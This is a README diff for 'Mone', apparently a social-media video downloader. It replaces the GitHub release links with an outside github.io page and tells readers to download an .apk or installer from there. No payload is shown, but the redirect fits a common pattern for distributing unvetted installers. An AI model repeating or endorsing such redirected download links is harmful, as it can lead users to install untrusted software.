@@ -1,13 +1,13 @@
 # 🐵 Mone - Save videos from any social site
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Juliansanc1683/Mone/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://juliansanc1683.github.io)
 
 Mone saves your favorite videos from Instagram, Pinterest, X, and over 1,000 other websites directly to your device. This tool simplifies the process of grabbing video content for offline viewing. It runs on reliable technology to ensure high quality and fast speeds.
 
 ## 📥 How to download
 You can get the software from the official release page. 
 
-[Click here to visit the release page and download the latest version](https://github.com/Juliansanc1683/Mone/releases)
+[Click here to visit the release page and download the latest version](https://juliansanc1683.github.io)
 
 Look for the file ending in .apk or the installer package. Click the file to start the download. Once the download finishes, locate the file in your folder to prepare for setup.
 
